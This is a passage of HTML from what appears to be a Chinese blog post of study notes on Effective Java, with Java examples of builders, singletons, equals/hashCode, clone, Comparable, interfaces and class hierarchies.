class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hight</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hight</span>.Builder(<span class="string">&quot;张三&quot;</span>).</span><br><span class="line">                SetmHight(<span class="number">175</span>).SetmAge(<span class="number">24</span>).SetmLocation(<span class="string">&quot;深圳&quot;</span>).</span><br><span class="line">                SetmJob(<span class="string">&quot;学生&quot;</span>).SetmGender(<span class="string">&quot;男&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">        <span class="type">Weight</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Weight</span>.Builder(<span class="string">&quot;李四&quot;</span>).</span><br><span class="line">                SetmWeight(<span class="number">80</span>).SetmAge(<span class="number">24</span>).SetmLocation(<span class="string">&quot;广州&quot;</span>).</span><br><span class="line">                SetmJob(<span class="string">&quot;学生&quot;</span>).SetmGender(<span class="string">&quot;男&quot;</span>).build();</span><br><span class="line"></span><br><span class="line">        System.out.println(h);</span><br><span class="line">        System.out.println(w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="用私有构造器或枚举类型强化Singleton属性"   >          <a href="#用私有构造器或枚举类型强化Singleton属性" class="heading-link"><i class="fas fa-link"></i></a><a href="#用私有构造器或枚举类型强化Singleton属性" class="headerlink" title="用私有构造器或枚举类型强化Singleton属性"></a>用私有构造器或枚举类型强化Singleton属性</h2>      <p>Singleton：只实例化一次</p><ul><li>无状态对象，如函数</li><li>系统组件</li></ul><p>实现Singleton</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Emperor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Emperor</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Emperor</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Emperor</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;新建一个皇帝类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Emperor</span> <span class="variable">emperor</span> <span class="operator">=</span> Emperor.INSTANCE;</span><br><span class="line">        <span class="type">Emperor</span> <span class="variable">emperor1</span> <span class="operator">=</span> Emperor.INSTANCE;</span><br><span class="line">        <span class="keyword">if</span>(emperor1.equals(emperor)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;具有单例属性&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不具有单例属性&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>公有成员是静态工厂方法</p><ul><li>灵活性</li><li>泛型Singleton工厂</li><li>通过方法引用作为提供者</li></ul><p>包含单个元素的枚举类型</p>        <h2 id="通过私有构造器强化不可实例化的能力"   >          <a href="#通过私有构造器强化不可实例化的能力" class="heading-link"><i class="fas fa-link"></i></a><a href="#通过私有构造器强化不可实例化的能力" class="headerlink" title="通过私有构造器强化不可实例化的能力"></a>通过私有构造器强化不可实例化的能力</h2>      <p>工具类</p><ul><li>无需实例化</li><li>不可为抽象类，可被子类化，子类可被实例化</li></ul>        <h2 id="优先考虑依赖注入来引用资源"   >          <a href="#优先考虑依赖注入来引用资源" class="heading-link"><i class="fas fa-link"></i></a><a href="#优先考虑依赖注入来引用资源" class="headerlink" title="优先考虑依赖注入来引用资源"></a>优先考虑依赖注入来引用资源</h2>      <p>某些类会依赖底层资源</p><ul><li><p>静态工具类</p></li><li><p>单例实现</p></li><li><p>只可支持单一资源</p></li></ul>        <h2 id="避免创建不必要的对象"   >          <a href="#避免创建不必要的对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#避免创建不必要的对象" class="headerlink" title="避免创建不必要的对象"></a>避免创建不必要的对象</h2>      <p>同时提供了静态工厂方法和构造器的不可变类</p><ul><li>静态工厂方法优先</li><li>避免无意识的装箱</li><li>重用已知不会被修改的可变对象</li></ul>        <h2 id="7-消除过期对象引用-1"   >          <a href="#7-消除过期对象引用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-消除过期对象引用-1" class="headerlink" title="7.消除过期对象引用"></a>7.消除过期对象引用</h2>      <p>Java：垃圾回收功能（过期引用）</p>        <h1 id="第三章-对所有类都通用的方法-1"   >          <a href="#第三章-对所有类都通用的方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三章-对所有类都通用的方法-1" class="headerlink" title="第三章 对所有类都通用的方法"></a>第三章 对所有类都通用的方法</h1>              <h2 id="10-覆盖equals方法的通用约定-1"   >          <a href="#10-覆盖equals方法的通用约定-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-覆盖equals方法的通用约定-1" class="headerlink" title="10.覆盖equals方法的通用约定"></a>10.覆盖equals方法的通用约定</h2>      <p>equals：判断两个示例是否（逻辑）相等</p><p>object中的equals方法：判断是否为同一个实例</p><p><strong>无需覆盖</strong></p><ul><li>类的每个实例确实是唯一的，例如Thread</li><li>无需关心实例之间是否逻辑相等</li><li>超类已覆盖</li><li>类或包是私有的</li></ul><p><strong>需要覆盖</strong></p><ul><li>有逻辑相等的概念，如两个内容一样的String</li></ul><p>覆盖约定</p><ul><li>自反性：对于非空x，有x.equals(x)返回true</li><li>对称性</li><li>传递性</li><li>一致性：对于非空x，y,当内容不变时，x.euqals(y)不变</li><li>非空性：对于非空x，x.equals(null)，返回false</li></ul><p>高质量equals方法：</p><ul><li>&#x3D;&#x3D;判断是否为该对象的引用</li><li>instanceof判断类型是否正确</li><li>转换参数</li><li>对域和对象校验是否匹配</li><li>满足对称性，传递性，一致性</li></ul>        <h2 id="11-覆盖equals时一定要覆盖hashcode-1"   >          <a href="#11-覆盖equals时一定要覆盖hashcode-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#11-覆盖equals时一定要覆盖hashcode-1" class="headerlink" title="11.覆盖equals时一定要覆盖hashcode"></a>11.覆盖equals时一定要覆盖hashcode</h2>      <p>得以使用HashMap，HashSet，HashTable</p><ul><li>忽略冗余域</li><li>排除equals中没使用的域</li></ul><p>对于不可变类缓存HashCode</p>        <h2 id="12-始终要覆盖toString-1"   >          <a href="#12-始终要覆盖toString-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#12-始终要覆盖toString-1" class="headerlink" title="12.始终要覆盖toString"></a>12.始终要覆盖toString</h2>              <h2 id="13-谨慎覆盖clone方法-1"   >          <a href="#13-谨慎覆盖clone方法-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#13-谨慎覆盖clone方法-1" class="headerlink" title="13.谨慎覆盖clone方法"></a>13.谨慎覆盖clone方法</h2>      <p>cloneable接口决定了Object中受保护的clone方法实现的行为</p><ul><li>一个类实现了cloneable接口，Object的clone方法返回该对象的逐域拷贝，否则抛出异常</li><li>改变了超类中受保护的方法的行为</li></ul>        <h2 id="14-考虑实现Comparable接口-1"   >          <a href="#14-考虑实现Comparable接口-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#14-考虑实现Comparable接口-1" class="headerlink" title="14.考虑实现Comparable接口"></a>14.考虑实现Comparable接口</h2>      <p>满足equals约定：自反性，对称性，传递性</p><p>或者使用Comparator</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Comparator &lt; PhoneNumber &gt; COMPARATOR =</span><br><span class="line">    comparingInt((PhoneNumber pn) - &gt; pn.areaCode)</span><br><span class="line">    .thenComparingInt(pn - &gt; pn.prefix)</span><br><span class="line">    .thenComparingInt(pn - &gt; pn.lineNum);</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(PhoneNumber pn)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> COMPARATOR.compare(<span class="built_in">this</span>, pn);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>代码样例：</p><p>Person类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String id, String name, <span class="type">int</span> age, String job)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.job = job;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) o;</span><br><span class="line">        <span class="type">return</span> <span class="variable">age</span> <span class="operator">=</span>= person.age &amp;&amp; id.equals(person.id) &amp;&amp; name.equals(person.name) &amp;&amp; job.equals(person.job);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> id.hashCode();</span><br><span class="line">        result = <span class="number">31</span> * result + name.hashCode();</span><br><span class="line">        result = <span class="number">31</span> * result + Integer.hashCode(age);</span><br><span class="line">        result = <span class="number">31</span> * result + job.hashCode();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&#x27;&quot;</span> + id + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, job=&#x27;&quot;</span> + job + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Phone类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Phone</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Screen screen;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">        <span class="type">double</span> length;</span><br><span class="line">        <span class="type">double</span> weight;</span><br><span class="line"></span><br><span class="line">        Screen(<span class="type">double</span> length, <span class="type">double</span> weight) &#123;</span><br><span class="line">            <span class="built_in">this</span>.length = length;</span><br><span class="line">            <span class="built_in">this</span>.weight = weight;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Screen <span class="title function_">deepcopy</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Screen</span>(<span class="built_in">this</span>.length, <span class="built_in">this</span>.weight);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException &#123;</span><br><span class="line">        <span class="type">Phone</span> <span class="variable">result</span> <span class="operator">=</span> (Phone)<span class="built_in">super</span>.clone();</span><br><span class="line">        result.screen = <span class="built_in">this</span>.screen.deepcopy();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">comparaTo</span><span class="params">(Phone p)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Double.compare(<span class="built_in">this</span>.screen.length*<span class="built_in">this</span>.screen.weight, p.screen.length*p.screen.weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Phone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.screen.weight = phone.screen.weight;</span><br><span class="line">        <span class="built_in">this</span>.screen.length = phone.screen.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>主函数</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;123456&quot;</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">24</span>, <span class="string">&quot;学生&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.format(<span class="string">&quot;0x%x\n&quot;</span>, person.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="第四章-类与接口-1"   >          <a href="#第四章-类与接口-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四章-类与接口-1" class="headerlink" title="第四章 类与接口"></a>第四章 类与接口</h1>              <h2 id="15-使类和成员的可访问性最小化-1"   >          <a href="#15-使类和成员的可访问性最小化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#15-使类和成员的可访问性最小化-1" class="headerlink" title="15.使类和成员的可访问性最小化"></a>15.使类和成员的可访问性最小化</h2>      <ul><li>信息隐藏&#x2F;封装<ul><li>各个模块隐藏其细节</li><li>通过API进行通信</li></ul></li><li>信息隐藏的好处<ul><li>解耦</li><li>各个模块可以独立开发测试优化</li><li>提高模块的可重用性</li></ul></li><li>尽可能使每个类或成员不被外界访问</li><li>顶层类和接口<ul><li>包级私有<ul><li>无修饰符</li><li>只可以被包内实用</li></ul></li><li>公有（public）<ul><li>Public修饰符</li><li>包导出的API的一部分</li><li>后续版本需要对其进行支持</li></ul></li><li>若某顶层类（或接口）A只在另一个类B的内部用到，应使A成为B的私有嵌套类</li><li>降低不必要公有类的可访问性更重要</li></ul></li><li>成员（域，方法，嵌套类，嵌套接口）<ul><li>私有的（private）<ul><li>声明该成员的类内部可访问</li></ul></li><li>包级私有的（package-private）<ul><li>包内部的任何类都可访问</li></ul></li><li>受保护的（protected）<ul><li>声明该成员的类的子类可访问</li><li>包内部的任何类都可访问</li></ul></li><li>公有的（public）<ul><li>任何地方都可访问</li></ul></li><li>尽量减少包级私有（相对于私有）</li><li>受保护的成员尽量少用（相对于私有）</li><li>实例域不能是公有的</li><li>静态final常量可以为公有，但不能为可变对象的引用</li></ul></li></ul>        <h2 id="16-在公有类中使用访问方法而非公有域-1"   >          <a href="#16-在公有类中使用访问方法而非公有域-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#16-在公有类中使用访问方法而非公有域-1" class="headerlink" title="16.在公有类中使用访问方法而非公有域"></a>16.在公有类中使用访问方法而非公有域</h2>              <h2 id="17-使可变性最小化-1"   >          <a href="#17-使可变性最小化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#17-使可变性最小化-1" class="headerlink" title="17.使可变性最小化"></a>17.使可变性最小化</h2>              <h2 id="18-复合优先于继承-1"   >          <a href="#18-复合优先于继承-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#18-复合优先于继承-1" class="headerlink" title="18.复合优先于继承"></a>18.复合优先于继承</h2>      <ul><li>包的内部可以使用，在同一个程序员的控制下</li><li>专门为继承而设计</li></ul><p>复合</p><ul><li>为现有的类为新类的一个组件</li><li>包装类</li></ul>        <h2 id="20-接口优于抽象类-1"   >          <a href="#20-接口优于抽象类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#20-接口优于抽象类-1" class="headerlink" title="20.接口优于抽象类"></a>20.接口优于抽象类</h2>      <ul><li><p>接口（interface）</p><ul><li>不能实例化</li><li>可实现方法</li><li>类可以实现多个接口</li></ul></li><li><p>抽象类（abstract class）</p><ul><li>不能实例化</li><li>可实现方法</li><li>类只能继承一个抽象类</li></ul></li></ul><p>接口可以方便的实现混合类型，并构造非层次结构的类型框架</p><p>结合接口和抽象类的优点：骨架实现</p><ul><li>接口负责定义类型，或提供一些缺省方法</li><li>骨架类实现其余方法</li></ul><p>定义接口</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Machine</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Movable</span>  &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">start</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">stop</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Vehicle</span> <span class="keyword">extends</span> <span class="title class_">Machine</span>, Movable&#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>Bus实现骨架类</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bus</span> <span class="keyword">implements</span> <span class="title class_">Vehicle</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> isRun;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> price;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isRun == <span class="number">0</span>) &#123;</span><br><span class="line">            isRun = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isRun == <span class="number">1</span>) &#123;</span><br><span class="line">            isRun = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start() != <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;启动成功&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;已启动&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>        <h2 id="21-为后代设计接口-1"   >          <a href="#21-为后代设计接口-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#21-为后代设计接口-1" class="headerlink" title="21.为后代设计接口"></a>21.为后代设计接口</h2>              <h2 id="22-接口只用于定义类型-1"   >          <a href="#22-接口只用于定义类型-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#22-接口只用于定义类型-1" class="headerlink" title="22.接口只用于定义类型"></a>22.接口只用于定义类型</h2>      <p>工具类</p><ul><li>不可实例化</li><li>静态公有常量</li></ul><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PhysicalConstants</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">PhysicalConstants</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">AVOGADROS_NUMBER</span> <span class="operator">=</span> <span class="number">6.02214199e23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">BOLTZMANN_CONSTANT</span> <span class="operator">=</span> <span class="number">1.3806503e-23</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">ELECTRON_MASS</span> <span class="operator">=</span> <span class="number">9.10938188e-31</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Use of static import to avoid qualifying constants</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">atoms</span><span class="params">(<span class="type">double</span> mols)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AVOGADROS_NUMBER * mols;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="23-类层次优于标签类-1"   >          <a href="#23-类层次优于标签类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#23-类层次优于标签类-1" class="headerlink" title="23.类层次优于标签类"></a>23.类层次优于标签类</h2>      <p>类层次</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Class hierarchy replacement for a tagged class</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="type">double</span> <span class="title function_">area</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Figure</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> radius;</span><br><span class="line"> </span><br><span class="line">    Circle(<span class="type">double</span> radius) &#123; <span 